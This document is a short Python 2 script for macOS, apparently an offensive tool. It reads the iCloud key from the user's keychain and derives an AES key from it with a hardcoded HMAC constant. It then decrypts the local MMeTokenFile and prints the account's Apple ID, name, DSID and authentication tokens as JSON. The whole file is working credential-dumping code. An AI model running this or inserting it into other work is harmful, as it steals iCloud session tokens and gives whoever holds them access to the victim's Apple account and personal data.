import base64
import hashlib
import hmac
import subprocess
import sys
import glob
import os
import binascii
import json
from Foundation import NSData, NSPropertyListSerialization


def print_tokens_json(token_plist):
    apple_id = token_plist["appleAccountInfo"]["appleId"]
    full_name = token_plist["appleAccountInfo"]["fullName"]
    dsPrsID = token_plist["appleAccountInfo"]["dsPrsID"]

    values = {}

    values.update({"fullName": full_name})
    values.update({"dsPrsID": dsPrsID})

    for key in token_plist["tokens"].keys():
        values.update({key: token_plist["tokens"][key]})

    print json.dumps({apple_id: values})


if __name__ == '__main__':
    icloud_key = subprocess.check_output("security find-generic-password -ws 'iCloud' | awk {'print $1'}",
                                         shell=True).replace("\n", "")

    if icloud_key == "":
        print "Failed to get iCloud Decryption Key."
        sys.exit()

    msg = base64.b64decode(icloud_key)
    key = "t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"  # Constant key used for hashing Hmac on all versions of macOS.

    # Create Hmac with this key and icloud_key using MD5
    hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()
    hexed_key = binascii.hexlify(hashed)  # Turn into hex for openssl subprocess
    IV = 16 * '0'
    mme_token_file = glob.glob("%s/Library/Application Support/iCloud/Accounts/*" % os.path.expanduser("~"))

    for x in mme_token_file:
        try:
            int(x.split("/")[-1])  # If we can cast to int we have the DSID / account file.
            mme_token_file = x
        except ValueError:
            continue
    if not isinstance(mme_token_file, str):
        print "Failed to find MMeTokenFile."
        sys.exit()

    # Perform decryption with zero dependencies by using openssl binary
    decrypted_binary = subprocess.check_output(
        "openssl enc -d -aes-128-cbc -iv '%s' -K %s < '%s'" % (IV, hexed_key, mme_token_file), shell=True)
    # Convert the decrypted binary plist to an NSData object that can be read
    bin_to_plist = NSData.dataWithBytes_length_(decrypted_binary, len(decrypted_binary))
    # Convert the binary NSData object into a dictionary object
    token_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(bin_to_plist, 0, None, None)[0]

    print_tokens_json(token_plist)
